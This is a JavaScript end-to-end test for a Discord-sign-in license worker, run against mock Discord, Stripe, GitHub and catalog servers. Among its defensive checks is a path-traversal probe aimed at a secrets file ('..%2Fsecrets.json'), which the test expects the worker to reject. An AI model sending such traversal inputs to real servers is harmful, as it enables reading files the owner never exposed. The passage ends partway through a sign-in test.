// End-to-end test: runs the worker in wrangler's local runtime (real D1, real WebCrypto)
// against a mock Discord API, then checks the whole "Continue with Discord" flow.
//   npm test
import { spawn, execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { createHmac } from "node:crypto";
import { mkdtempSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import assert from "node:assert/strict";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const WORKER_PORT = 8791, APPROVAL_PORT = 8795, DISCORD_PORT = 8792, GUILD = "999000111";
let BASE = `http://127.0.0.1:${WORKER_PORT}`;
const tmp = mkdtempSync(join(tmpdir(), "orbit-license-test-"));

// Discord IDs are snowflakes: the top bits are the account's creation time.
const snowflake = (ms) => String((BigInt(ms) - 1420070400000n) << 22n);
const USERS = {
  alice: { id: snowflake(Date.parse("2019-01-01")), username: "alice", guilds: [GUILD] },
  bob:   { id: snowflake(Date.parse("2020-06-01")), username: "bob", guilds: [GUILD] },
  fresh: { id: snowflake(Date.now() - 2 * 86400000), username: "fresh", guilds: [GUILD] },
  outsider: { id: snowflake(Date.parse("2018-01-01")), username: "outsider", guilds: ["123"] },
  robot: { id: snowflake(Date.parse("2018-01-01")), username: "robot", guilds: [GUILD], bot: true },
  carol: { id: snowflake(Date.parse("2021-03-01")), username: "carol_x", guilds: [] },
  dave:  { id: snowflake(Date.parse("2021-04-01")), username: "dave", guilds: [] },
  erin:  { id: snowflake(Date.parse("2021-05-01")), username: "erin", guilds: [] },
  frank: { id: snowflake(Date.parse("2021-06-01")), username: "frank", guilds: [] },
  gina:  { id: snowflake(Date.parse("2021-07-01")), username: "gina", guilds: [] },
  hana:  { id: snowflake(Date.parse("2021-08-01")), username: "hana", guilds: [] },
  ivan:  { id: snowflake(Date.parse("2021-09-01")), username: "ivan", guilds: [] },
  owen:  { id: snowflake(Date.parse("2021-10-01")), username: "owen", guilds: [] },
  quinn: { id: snowflake(Date.parse("2021-11-01")), username: "quinn", guilds: [] },
  rosa:  { id: snowflake(Date.parse("2021-12-01")), username: "rosa", guilds: [] },
  // Payments: buyers approved after payments began.
  tess:  { id: snowflake(Date.parse("2022-01-01")), username: "tess", guilds: [] },
  uma:   { id: snowflake(Date.parse("2022-02-01")), username: "uma", guilds: [] },
  wes:   { id: snowflake(Date.parse("2022-03-01")), username: "wes", guilds: [] },
  vic:   { id: snowflake(Date.parse("2022-04-01")), username: "vic", guilds: [] },   // approved before payments began
};
const OWNER = snowflake(Date.parse("2017-02-01"));   // NOTIFY_USER_ID in approval mode

const mirrorHits = [];   // requests the worker made for /mirror
const MIRROR_UPDATE = { version: "1.9.99", url: "index-1.9.99.html", sha256: "ab".repeat(32), signature: "c2ln", notes: "Sample" };
const MIRROR_PAGE = "<!doctype html><title>FAFO 1.9.99</title><script>window.x = 1</script>\n";
// Product pictures (app 1.9.113): a stand-in catalog. Ten filler groups newer than the Mega Evolution base set (ME01) push
// it, Prismatic Evolutions and the Scarlet & Violet base set out of the newest ten, so they're only searched for sharing a
// word (or a series) with the name; 905 is newest and answers 500.
const catalogHits = [], imageHits = [];
let catalogDown = false;
const PIXEL = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
const card = (productId, name, number) => ({ productId, name, cleanName: name, imageUrl: "", extendedData: [{ name: "Number", displayName: "Card Number", value: number }, { name: "Rarity", displayName: "Rarity", value: "Double Rare" }] });
const sealed = (productId, name) => ({ productId, name, cleanName: name.replace(/[^\w ]/g, ""), imageUrl: `https://tcgplayer-cdn.tcgplayer.com/product/${productId}_200w.jpg`, extendedData: [] });
const CATALOG_GROUPS = [
  { groupId: 900, name: "ME03: Delta Reign", abbreviation: "ME03", isSupplemental: false, publishedOn: "2026-09-26T00:00:00", modifiedOn: "2026-10-10T00:00:00", categoryId: 3 },
  { groupId: 901, name: "30th Celebration", abbreviation: "30TH", isSupplemental: false, publishedOn: "2026-10-03T00:00:00", modifiedOn: "2026-10-10T00:00:00", categoryId: 3 },
  { groupId: 902, name: "SV: Prismatic Evolutions", abbreviation: "PRE", isSupplemental: false, publishedOn: "2025-01-17T00:00:00", modifiedOn: "2026-10-01T00:00:00", categoryId: 3 },
  { groupId: 903, name: "ME01: Mega Evolution", abbreviation: "MEG", isSupplemental: false, publishedOn: "2025-09-26T00:00:00", modifiedOn: "2026-10-01T00:00:00", categoryId: 3 },
  { groupId: 904, name: "Celebrations", abbreviation: "CEL", isSupplemental: false, publishedOn: "2021-10-08T00:00:00", modifiedOn: "2026-01-01T00:00:00", categoryId: 3 },
  { groupId: 905, name: "ME04: Broken Set", abbreviation: "ME04", isSupplemental: false, publishedOn: "2026-11-20T00:00:00", modifiedOn: "2026-10-10T00:00:00", categoryId: 3 },
  { groupId: 906, name: "SV01: Scarlet & Violet Base Set", abbreviation: "SV01", isSupplemental: false, publishedOn: "2023-03-31T00:00:00", modifiedOn: "2026-01-01T00:00:00", categoryId: 3 },
  ...Array.from({ length: 10 }, (_, i) => ({ groupId: 910 + i, name: `Filler Set ${i + 1}`, abbreviation: "F" + i, isSupplemental: false, publishedOn: `2025-1${i % 3}-1${i}T00:00:00`.replace(/^2025-12-1[3-9]/, "2026-01-1" + i), modifiedOn: "2026-01-01T00:00:00", categoryId: 3 })),
];
const CATALOG_PRODUCTS = {
  900: [sealed(712104, "Delta Reign Pokemon Center Elite Trainer Box"), sealed(712100, "Delta Reign Elite Trainer Box"), sealed(712101, "Delta Reign Booster Box"),
    sealed(712102, "Delta Reign Booster Box Case"), sealed(712103, "Delta Reign Booster Bundle"), sealed(712105, "Delta Reign 3 Pack Blister [Mega Gengar]"),
    sealed(712106, "Delta Reign 3 Pack Blister [Mega Froslass]"), sealed(712190, "30th Celebration Collection"), card(712200, "Mega Gengar ex - 091/131", "091/131")],
  901: [sealed(720001, "30th Celebration Figure Collection [Mew]"), sealed(720003, "30th Celebration Ultra Premium Collection [Day]"),
    sealed(720004, "30th Celebration Ultra Premium Collection [Night]"), sealed(720005, "30th Celebration Ditto Premium Collection"), sealed(720190, "Delta Reign Collection")],
  902: [sealed(600001, "Prismatic Evolutions Elite Trainer Box"), sealed(600002, "Prismatic Evolutions Pokemon Center Elite Trainer Box")],
  903: [sealed(650001, "Mega Evolution Elite Trainer Box [Mega Lucario]"), sealed(650002, "Mega Evolution Elite Trainer Box [Mega Gardevoir]"),
    sealed(650003, "Mega Evolution Booster Bundle")],
  906: [sealed(500001, "Scarlet & Violet Booster Bundle"), sealed(500002, "Scarlet & Violet Elite Trainer Box [Koraidon]")],
  904: [sealed(300001, "Celebrations Elite Trainer Box")],
};
// Stripe's API (2026-09-30.endive), as much of it as the worker uses, kept in memory. Tests change its objects directly (a
// session paid, a subscription past due) and send the webhooks Stripe would. stripeCalls records each request.
const stripeCalls = [], stripeFails = [];   // stripeFails: the next calls whose path matches answer {status, error}
const sx = { n: 0, customers: new Map(), products: new Map(), prices: new Map(), sessions: new Map(), subs: new Map(), invoices: new Map(), refunds: [], intents: new Map(), idem: new Map(),
  declineNext: false, pendingNext: false };
const sxId = (p) => `${p}_${String(++sx.n).padStart(6, "0")}`;
const sxNow = () => Math.floor(Date.now() / 1000);
function stripeRoute(req, u, body) {
  const p = req.method === "GET" || req.method === "DELETE" ? u.searchParams : new URLSearchParams(body), path = u.pathname.slice("/stripe".length);
  const call = { method: req.method, path, params: Object.fromEntries(p), idem: req.headers["idempotency-key"] || null, version: req.headers["stripe-version"], auth: req.headers.authorization };
  stripeCalls.push(call);
  const err = (status, e) => [status, { error: { type: "invalid_request_error", ...e } }];
  const miss = (what) => err(404, { code: "resource_missing", message: `No such ${what}`, param: "id" });
  const f = stripeFails.findIndex((x) => x.path.test(path) && (!x.method || x.method === req.method));
  if (f >= 0) { const x = stripeFails.splice(f, 1)[0]; return [x.status, { error: x.error }]; }
  if (call.idem && sx.idem.has(call.idem)) return sx.idem.get(call.idem);
  const keep = (r) => { if (call.idem) sx.idem.set(call.idem, r); return r; };
  const metadata = (pre) => Object.fromEntries([...p].filter(([k]) => k.startsWith(pre + "[")).map(([k, v]) => [k.slice(pre.length + 1, -1), v]));
  let m;
  if (req.method === "POST" && path === "/v1/customers") {
    const c = { id: sxId("cus"), object: "customer", name: p.get("name"), metadata: metadata("metadata") };
    sx.customers.set(c.id, c); return keep([200, c]);
  }
  if (req.method === "GET" && path === "/v1/prices") {
    const keys = [...p].filter(([k]) => k.startsWith("lookup_keys")).map(([, v]) => v);
    return [200, { object: "list", data: [...sx.prices.values()].filter((x) => keys.includes(x.lookup_key)) }];
  }
  if (req.method === "POST" && path === "/v1/products") {
    if (sx.products.has(p.get("id"))) return err(400, { code: "resource_already_exists", message: "Product already exists." });
    const x = { id: p.get("id"), object: "product", name: p.get("name") }; sx.products.set(x.id, x); return keep([200, x]);
  }
  if (req.method === "POST" && path === "/v1/prices") {
    const x = { id: sxId("price"), object: "price", product: p.get("product"), unit_amount: Number(p.get("unit_amount")), currency: p.get("currency"),
      recurring: { interval: p.get("recurring[interval]") }, lookup_key: p.get("lookup_key") };
    sx.prices.set(x.id, x); return keep([200, x]);
  }
  if (req.method === "POST" && path === "/v1/checkout/sessions") {
    const mode = p.get("mode"), id = sxId("cs_test");
    if (p.get("customer") && !sx.customers.has(p.get("customer"))) return err(400, { code: "resource_missing", param: "customer", message: "No such customer" });
    const items = [];
    for (let i = 0; p.has(`line_items[${i}][quantity]`); i++) items.push({ price: p.get(`line_items[${i}][price]`), quantity: Number(p.get(`line_items[${i}][quantity]`)),
      unit: Number(p.get(`line_items[${i}][price_data][unit_amount]`)) || (sx.prices.get(p.get(`line_items[${i}][price]`)) || {}).unit_amount || 0 });
    const s = { id, object: "checkout.session", url: `https://checkout.stripe.test/c/pay/${id}`, status: "open", payment_status: "unpaid", mode, customer: p.get("customer"),
      client_reference_id: p.get("client_reference_id"), metadata: metadata("metadata"), amount_total: items.reduce((n, x) => n + x.unit * x.quantity, 0), currency: "usd",
      expires_at: Number(p.get("expires_at")), livemode: true, payment_intent: null, subscription: null, success_url: p.get("success_url"), items,
      intent_metadata: metadata("payment_intent_data[metadata]"), sub_metadata: metadata("subscription_data[metadata]") };
    sx.sessions.set(id, s); return keep([200, s]);
  }
  if ((m = /^\/v1\/checkout\/sessions\/([^/]+)(\/expire)?$/.exec(path))) {
    const s = sx.sessions.get(m[1]);
    if (!s) return miss("checkout.session");
    if (!m[2]) return [200, s];
    if (s.status !== "open") return err(400, { message: 'Only Checkout Sessions with a status in ["open"] can be expired.' });
    Object.assign(s, { status: "expired", url: null }); return [200, s];
  }
  if (req.method === "GET" && path === "/v1/subscriptions") {
    if (!sx.customers.has(p.get("customer"))) return err(404, { code: "resource_missing", param: "customer", message: "No such customer" });
    return [200, { object: "list", data: [...sx.subs.values()].filter((x) => x.customer === p.get("customer")) }];
  }
  if ((m = /^\/v1\/subscriptions\/([^/]+)$/.exec(path))) {
    const s = sx.subs.get(m[1]);
    if (!s) return miss("subscription");
    if (req.method === "GET" && p.get("expand[0]") === "latest_invoice") return [200, { ...s, latest_invoice: sx.invoices.get(s.latest_invoice) || null }];
    if (req.method === "DELETE") { Object.assign(s, { status: "canceled", ended_at: sxNow() }); return [200, s]; }
    if (req.method === "POST") {
      if (p.has("cancel_at_period_end")) s.cancel_at_period_end = p.get("cancel_at_period_end") === "true";
      if (p.has("pause_collection[behavior]")) s.pause_collection = { behavior: p.get("pause_collection[behavior]") };
      else if (p.has("pause_collection")) s.pause_collection = null;
      if (p.has("items[0][deleted]")) s.items.data = s.items.data.filter((i) => i.id !== p.get("items[0][id]"));
      else if (p.has("items[0][price]")) {
        if (sx.declineNext) { sx.declineNext = false; return [402, { error: { type: "card_error", code: "card_declined", message: "Your card was declined." } }]; }
        const inv = { id: sxId("in"), object: "invoice", status: "open", hosted_invoice_url: `https://invoice.stripe.test/i/${sx.n}`, created: sxNow(), subscription: s.id };
        sx.invoices.set(inv.id, inv); s.latest_invoice = inv.id;
        if (sx.pendingNext) { sx.pendingNext = false; s.pending_update = { subscription_items: [{ price: p.get("items[0][price]") }] }; return [200, s]; }
        inv.status = "paid";
        s.items.data.push({ id: sxId("si"), object: "subscription_item", price: sx.prices.get(p.get("items[0][price]")), quantity: Number(p.get("items[0][quantity]")), current_period_end: s.items.data[0].current_period_end });
      }
      return [200, s];
    }
    return [200, s];
  }
  if (req.method === "GET" && path === "/v1/invoices") return [200, { object: "list", data: [...sx.invoices.values()].filter((x) => x.subscription === p.get("subscription") && x.status === p.get("status")) }];
  if ((m = /^\/v1\/invoices\/([^/]+)$/.exec(path))) return sx.invoices.has(m[1]) ? [200, sx.invoices.get(m[1])] : miss("invoice");
  if (req.method === "GET" && path === "/v1/refunds") return [200, { object: "list", data: sx.refunds.filter((x) => x.payment_intent === p.get("payment_intent")) }];
  if (req.method === "POST" && path === "/v1/refunds") {
    const r = { id: sxId("re"), object: "refund", amount: Number(p.get("amount")), payment_intent: p.get("payment_intent"), metadata: metadata("metadata"), status: "succeeded", created: sxNow() };
    sx.refunds.push(r); return keep([200, r]);
  }
  if ((m = /^\/v1\/payment_intents\/([^/]+)$/.exec(path))) return sx.intents.has(m[1]) ? [200, sx.intents.get(m[1])] : miss("payment_intent");
  return miss("route " + path);
}
// The buyer finishes on Stripe: a payment session paid (with its PaymentIntent), or a subscription session's plan made.
const sxPay = (id) => {
  const s = sx.sessions.get(id), pi = sxId("pi");
  sx.intents.set(pi, { id: pi, object: "payment_intent", metadata: s.intent_metadata, customer: s.customer });
  return Object.assign(s, { status: "complete", payment_status: "paid", payment_intent: pi });
};
const sxSub = (customer, priceIds, metadata, extra = {}) => {
  const end = sxNow() + 30 * 86400, id = sxId("sub"), inv = { id: sxId("in"), object: "invoice", status: "paid", hosted_invoice_url: `https://invoice.stripe.test/i/${sx.n}`, created: sxNow(), subscription: id };
  sx.invoices.set(inv.id, inv);
  const sub = { id, object: "subscription", status: "active", customer, metadata, cancel_at_period_end: false, pause_collection: null, start_date: sxNow(), ended_at: null,
    latest_invoice: inv.id, pending_update: null, items: { object: "list", data: priceIds.map((id) => ({ id: sxId("si"), object: "subscription_item", price: sx.prices.get(id), quantity: 1, current_period_end: end })) }, ...extra };
  sx.subs.set(sub.id, sub); return sub;
};
// Stripe renews a subscription: the next period, with its invoice a draft for about an hour before it's charged.
const sxRenew = (sub, days = 30) => {
  const inv = { id: sxId("in"), object: "invoice", status: "draft", hosted_invoice_url: `https://invoice.stripe.test/i/${sx.n}`, created: sxNow(), subscription: sub.id };
  sx.invoices.set(inv.id, inv); sub.latest_invoice = inv.id;
  sub.items.data.forEach((i) => { i.current_period_end = sxNow() + days * 86400; });
  return inv;
};
const sxSubscribe = (id) => {
  const s = sx.sessions.get(id), sub = sxSub(s.customer, s.items.map((x) => x.price), s.sub_metadata);
  Object.assign(s, { status: "complete", payment_status: "paid", subscription: sub.id });
  return sub;
};
const webhookPosts = [], webhookEdits = [], webhookFail = [];
const buyerHookPosts = [];   // posts to buyers' own webhooks (order alerts)
let webhookHang = null;   // {ms, code}: the next webhook post waits ms, then fails with code (if given)
const discord = createServer(async (req, res) => {
  const chunks = []; for await (const c of req) chunks.push(c);
  const raw = Buffer.concat(chunks), body = raw.toString();
  const send = (code, data) => { res.writeHead(code, { "content-type": "application/json" }); res.end(JSON.stringify(data)); };
  const who = (req.headers.authorization || "").replace("Bearer tok-", "");
  if (req.method === "POST" && req.url === "/oauth2/token") {
    const p = new URLSearchParams(body);
    if (p.get("client_secret") !== "test-secret" || p.get("redirect_uri") !== BASE + "/discord/callback") return send(401, { error: "invalid_client" });
    return USERS[p.get("code")] ? send(200, { access_token: "tok-" + p.get("code"), token_type: "Bearer" }) : send(400, { error: "invalid_grant" });
  }
  if (req.url === "/users/@me" && USERS[who]) { const u = USERS[who]; return send(200, { id: u.id, username: u.username, bot: !!u.bot }); }
  if (req.url === "/users/@me/guilds" && USERS[who]) return send(200, USERS[who].guilds.map((id) => ({ id })));
  const u = new URL(req.url, "http://x");
  if (req.method === "GET" && u.pathname === "/gh.json") return send(200, ghList);
  // GitHub's raw files, for the copy at /mirror (app 1.9.83+).
  if (u.pathname.startsWith("/mirror-src/")) {
    mirrorHits.push(req.url);
    const name = u.pathname.slice("/mirror-src/".length);
    if (name === "update.json") return send(200, MIRROR_UPDATE);
    if (name === "licenses.json") return send(200, ghList);
    if (name === "index-1.9.99.html") { res.writeHead(200, { "content-type": "text/plain" }); return res.end(MIRROR_PAGE); }
    if (name === "index-9.9.9.html") return send(500, { message: "GitHub had a moment" });
    return send(404, {});
  }
  // TCGplayer's catalog as tcgcsv.com publishes it, and its picture servers (product pictures, app 1.9.113).
  if (u.pathname.startsWith("/catalog/")) {
    catalogHits.push(u.pathname);
    if (catalogDown) return send(503, { message: "down" });
    const rest = u.pathname.slice("/catalog/".length);
    if (rest === "groups") return send(200, { totalItems: CATALOG_GROUPS.length, success: true, errors: [], results: CATALOG_GROUPS });
    const m = /^(\d+)\/products$/.exec(rest);
    if (m && m[1] === "905") return send(500, { message: "broken" });
    if (m) { const results = CATALOG_PRODUCTS[m[1]] || []; return send(200, { totalItems: results.length, success: true, errors: [], results }); }
    return send(404, {});
  }
  if (u.pathname.startsWith("/img/")) {
    imageHits.push(u.pathname);
    const [, kind, file] = u.pathname.split("/").slice(1);
    const id = Number((file || "").replace(/_200w\.jpg$|\.jpg$/, ""));
    if (id === 650002) { res.writeHead(200, { "content-type": "text/html" }); return res.end("<p>not a picture</p>"); }
    if (kind === "fit" && id === 600001) return send(404, {});
    res.writeHead(200, { "content-type": "image/png" }); return res.end(PIXEL);
  }
  if (req.method === "POST" && u.pathname === "/webhook") {
    if (webhookHang) {
      const hang = webhookHang; webhookHang = null;
      await new Promise((r) => setTimeout(r, hang.ms));
      if (hang.code) return send(hang.code, { message: "fail" });
    }
    if (webhookFail.length) {
      const code = webhookFail.shift();   // 0 lets that post through
      if (code) return code === 429 ? send(429, { message: "You are being rate limited.", retry_after: 0.3 }) : send(code, { message: "fail" });
    }
    let data, files = [];
    if (/^multipart\//.test(req.headers["content-type"] || "")) {
      const form = await new Response(raw, { headers: { "content-type": req.headers["content-type"] } }).formData();
      data = JSON.parse(form.get("payload_json"));
      for (const [k, v] of form) if (k.startsWith("files[")) files.push({ name: v.name, text: await v.text(), type: v.type });
    } else data = JSON.parse(body);
    const m = { id: "msg" + (webhookPosts.length + 1), wait: u.searchParams.get("wait"), files, ...data };
    webhookPosts.push(m); return send(200, { id: m.id });
  }
  if (req.method === "PATCH" && u.pathname.startsWith("/webhook/messages/")) {
    webhookEdits.push({ id: u.pathname.split("/").pop(), ...JSON.parse(body) }); return send(200, {});
  }
  if (req.method === "POST" && u.pathname.startsWith("/buyerhook/")) {
    if (u.pathname.includes("/dead/")) return send(404, { message: "Unknown Webhook" });
    buyerHookPosts.push({ path: u.pathname, ...JSON.parse(body) }); return send(200, {});
  }
  if (u.pathname.startsWith("/stripe/v1/")) return send(...stripeRoute(req, u, body));
  send(404, {});
});

const { publicKey, privateKey } = await crypto.subtle.generateKey({ name: "ECDSA", namedCurve: "P-256" }, true, ["sign", "verify"]);
const privJwk = await crypto.subtle.exportKey("jwk", privateKey);
// A key made by hand, on a signed list like licenses.json on GitHub.
const GH_KEY = "PVLT-GHKE-YGHK-EYGH-KEY2";
const ghHash = Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + GH_KEY.replace(/-/g, "")))), (b) => b.toString(16).padStart(2, "0")).join("");
// Two more for the vault tests, which need licenses of their own.
const VAULT_KEYS = ["PVLT-VAUL-TKEY-AAAA-0001", "PVLT-VAUL-TKEY-AAAA-0002"];
const hashOfKey = async (k) => Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + k.replace(/-/g, "")))), (b) => b.toString(16).padStart(2, "0")).join("");
const ghBody = JSON.stringify({ v: 1, issued: new Date().toISOString(), keys: [{ h: ghHash }, ...await Promise.all(VAULT_KEYS.map(async (k) => ({ h: await hashOfKey(k) })))] });
const ghList = { body: ghBody, sig: Buffer.from(await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, privateKey, new TextEncoder().encode(ghBody))).toString("base64") };
const pubJwk = await crypto.subtle.exportKey("jwk", publicKey);
const common = [
  `DISCORD_CLIENT_ID=test-client`,
  `DISCORD_CLIENT_SECRET=test-secret`,
  `LICENSE_SIGNING_KEY=${JSON.stringify({ kty: "EC", crv: "P-256", x: privJwk.x, y: privJwk.y, d: privJwk.d })}`,
  `ADMIN_TOKEN=test-admin-token`,
  `DISCORD_WEBHOOK_URL=http://127.0.0.1:${DISCORD_PORT}/webhook`,
  `DISCORD_API_BASE=http://127.0.0.1:${DISCORD_PORT}`,
  `GH_LICENSE_URL=http://127.0.0.1:${DISCORD_PORT}/gh.json`,
  `MIRROR_BASE=http://127.0.0.1:${DISCORD_PORT}/mirror-src/`,
  `PICTURES_CATALOG=http://127.0.0.1:${DISCORD_PORT}/catalog`,
  `PICTURES_IMAGES=http://127.0.0.1:${DISCORD_PORT}/img/fit/{id}.jpg http://127.0.0.1:${DISCORD_PORT}/img/cdn/{id}_200w.jpg`,
  `PULL_STALE_MS=3000`,
  `ACCOUNT_OFFER_TTL_MS=8000`,
  `ACCOUNTS_LOW_AT=3`,
  `ASSIGNED_LIMIT=10`,
  `ALERT_WEBHOOK_TEST_PREFIX=http://127.0.0.1:${DISCORD_PORT}/buyerhook/`,
  `GH_LICENSE_PUB=${JSON.stringify({ kty: "EC", crv: "P-256", x: pubJwk.x, y: pubJwk.y })}`,
];

const env = { ...process.env, NO_PROXY: "127.0.0.1,localhost", no_proxy: "127.0.0.1,localhost", CI: "1" };
// Run wrangler's JS entry with this Node, so it works the same on Windows (where .bin/wrangler is a shell script).
const wrangler = [join(root, "node_modules", "wrangler", "bin", "wrangler.js")];
const workers = [];
let workerLog = () => "";   // the running worker's output, shown when a test fails
// Starts a worker with its own empty database, or on an earlier run's database (`db`).
// `vars` override wrangler.toml's [vars].
async function startWorker(name, port, vars, db) {
  const dir = join(tmp, db || name);
  if (!db) execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", dir, "--file", "schema.sql"], { cwd: root, env, stdio: "pipe" });
  writeFileSync(join(tmp, name + ".env"), [...common, ...vars].join("\n"));
  const dev = spawn(process.execPath, [...wrangler, "dev", "--local", "--ip", "127.0.0.1", "--port", String(port), "--persist-to", dir,
    "--env-file", join(tmp, name + ".env"), "--show-interactive-dev-session=false"], { cwd: root, env, stdio: ["ignore", "pipe", "pipe"] });
  let log = ""; dev.stdout.on("data", (d) => log += d); dev.stderr.on("data", (d) => log += d);
  workerLog = () => log;
  workers.push(dev);
  BASE = `http://127.0.0.1:${port}`;
  for (let i = 0; ; i++) {
    try { if ((await fetch(BASE + "/discord/ready")).ok) return; } catch {}
    if (i > 120) throw new Error("wrangler dev didn't start:\n" + log);
    await new Promise((r) => setTimeout(r, 500));
  }
}
// On Windows, killing wrangler leaves its workerd child running (and holding the database files)
// for a while, so the whole process tree is stopped there.
function stopWorker(w) {
  if (process.platform !== "win32") return w.kill("SIGTERM");
  try { execFileSync("taskkill", ["/pid", String(w.pid), "/t", "/f"], { stdio: "ignore" }); } catch {}
}
await new Promise((r) => discord.listen(DISCORD_PORT, "127.0.0.1", r));

let passed = 0;
const test = async (name, fn) => {
  try { await fn(); passed++; console.log("  ok  " + name); }
  catch (e) { console.log("  FAIL " + name + "\n  worker's last output:\n" + workerLog().slice(-4000)); throw e; }
};
const get = (path, opts = {}) => fetch(BASE + path, { redirect: "manual", ...opts });
const getJson = async (path, opts) => (await get(path, opts)).json();
const rid = () => crypto.randomUUID().replace(/-/g, "");
async function verifyList(list) {
  const sig = Uint8Array.from(atob(list.sig), (c) => c.charCodeAt(0));
  assert.ok(await crypto.subtle.verify({ name: "ECDSA", hash: "SHA-256" }, publicKey, sig, new TextEncoder().encode(list.body)), "list signature verifies");
  return JSON.parse(list.body);
}
async function keyHash(key) {
  const d = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("pvlt:" + key.toUpperCase().replace(/[^A-Z0-9]/g, "")));
  return Array.from(new Uint8Array(d), (b) => b.toString(16).padStart(2, "0")).join("");
}
// Runs the browser half: /discord/start, then Discord sends the user back with `code`.
async function signIn(r, code, extra = "") {
  const start = await get("/discord/start?r=" + r);
  assert.equal(start.status, 302);
  const loc = new URL(start.headers.get("location"));
  const state = loc.searchParams.get("state");
  return { loc, state, page: await get(`/discord/callback?state=${encodeURIComponent(state)}${code ? "&code=" + code : ""}${extra}`) };
}
const admin = (path, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { authorization: "Bearer test-admin-token", "content-type": "application/json" }, body: body && JSON.stringify(body) });
// Slot CSVs reach the channel with number cells (and any cell starting with = + - @) as ="…" Excel text.
// csvRows parses a CSV; asShown parses one and reads each ="…" cell (parts joined with &) as Excel shows it.
function csvRows(text) {
  const rows = []; let row = [], cur = "", q = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) { if (ch === '"') { if (text[i + 1] === '"') { cur += '"'; i++; } else q = false; } else cur += ch; }
    else if (ch === '"') q = true;
    else if (ch === ",") { row.push(cur); cur = ""; }
    else if (ch === "\n" || ch === "\r") { if (ch === "\r" && text[i + 1] === "\n") i++; row.push(cur); rows.push(row); row = []; cur = ""; }
    else cur += ch;
  }
  if (cur || row.length) { row.push(cur); rows.push(row); }
  return rows;
}
const EXCEL_STRINGS = /^=(?:"(?:[^"]|"")*")(?:&"(?:[^"]|"")*")*$/;
const shown = (v) => EXCEL_STRINGS.test(v) ? [...v.slice(1).matchAll(/"((?:[^"]|"")*)"/g)].map((m) => m[1].replace(/""/g, '"')).join("") : v;
const asShown = (text) => csvRows(text).map((r) => r.map(shown));
// A batch's files other than the AYCD lists (2026-10-06+) and Shikari CSVs (2026-10-09+), those lists parsed, and the
// Shikari files.
const plain = (m) => m.files.filter((f) => !f.name.endsWith("-aycd.json") && !f.name.endsWith("-shikari.csv"));
const aycdOf = (m) => m.files.filter((f) => f.name.endsWith("-aycd.json")).map((f) => JSON.parse(f.text));
const shikariOf = (m) => m.files.filter((f) => f.name.endsWith("-shikari.csv"));
const cellT = (v) => /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;

try {
  console.log("Automatic mode");
  await startWorker("auto", WORKER_PORT, ["REQUIRE_APPROVAL=", `REQUIRED_GUILD_ID=${GUILD}`, "MIN_ACCOUNT_AGE_DAYS=30"]);
  let aliceKey, firstIssued;
  await test("ready reports configured", async () => assert.deepEqual(await getJson("/discord/ready"), { ready: true }));
  // A copy of GitHub's files for networks that block raw.githubusercontent.com (app 1.9.83+).
  await test("mirror: update.json, a page and licenses.json come as GitHub has them", async () => {
    mirrorHits.length = 0;
    const u = await get("/mirror/update.json?t=123");
    assert.equal(u.status, 200);
    assert.deepEqual(await u.json(), MIRROR_UPDATE);
    assert.match(u.headers.get("content-type"), /^application\/json/);
    assert.equal(u.headers.get("access-control-allow-origin"), "*");
    assert.equal(u.headers.get("cache-control"), "no-store");
    const p = await get("/mirror/index-1.9.99.html");
    assert.equal(p.status, 200);
    assert.equal(await p.text(), MIRROR_PAGE);
    assert.match(p.headers.get("content-type"), /^text\/plain/);
    assert.equal(p.headers.get("x-content-type-options"), "nosniff");
    const l = await get("/mirror/licenses.json");
    assert.deepEqual(await l.json(), ghList);
    assert.deepEqual(mirrorHits, ["/mirror-src/update.json", "/mirror-src/index-1.9.99.html", "/mirror-src/licenses.json"], "fetched by name only, without the query");
  });
  await test("mirror: a page GitHub doesn't have is 404, a GitHub error is 502", async () => {
    const a = await get("/mirror/index-1.9.98.html");
    assert.equal(a.status, 404);
    assert.equal(a.headers.get("cache-control"), "no-store");
    assert.equal((await get("/mirror/index-9.9.9.html")).status, 502);
  });
  await test("mirror: nothing but those files, and only GET", async () => {
    mirrorHits.length = 0;
    for (const p of ["/mirror/licenses.json.js", "/mirror/index-1.9.99.html.js", "/mirror/index-1.9.html", "/mirror/README.md", "/mirror/..%2Fsecrets.json",
      "/mirror/license-worker/src/index.js", "/mirror/", "/mirror/update.json/x", "/mirror/UPDATE.JSON", "/mirror/index-1.9.99.htm"]) {
      assert.equal((await get(p)).status, 404, p);
    }
    assert.equal((await get("/mirror/update.json", { method: "POST", body: "{}" })).status, 404);
    assert.deepEqual(mirrorHits, [], "GitHub wasn't asked for any of them");
  });
  await test("empty list is signed", async () => {
    const b = await verifyList(await getJson("/licenses"));
    assert.deepEqual(b.keys, []); firstIssued = b.issued;
  });
  await test("start rejects a bad request id", async () => assert.equal((await get("/discord/start?r=short")).status, 400));
  await test("start redirects to Discord with state, scopes and callback", async () => {
    const r = rid();
    const res = await get("/discord/start?r=" + r);
    const loc = new URL(res.headers.get("location"));
    assert.equal(loc.origin + loc.pathname, "https://discord.com/oauth2/authorize");
    assert.equal(loc.searchParams.get("client_id"), "test-client");
    assert.equal(loc.searchParams.get("redirect_uri"), BASE + "/discord/callback");
    assert.equal(loc.searchParams.get("scope"), "identify guilds");
    assert.ok(loc.searchParams.get("state").length >= 30);
    assert.deepEqual(await getJson("/discord/status/" + r), { status: "pending" });
  });
  await test("sign-in issues a key the app can pick up", async () => {
    const r = rid();
    const { page } = await signIn(r, "alice");
    assert.equal(page.status, 200);
    const html = await page.text();
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued");
    assert.equal(s.username, "alice");
    assert.match(s.key, /^PVLT(-[A-Z0-9]{4}){4}$/);
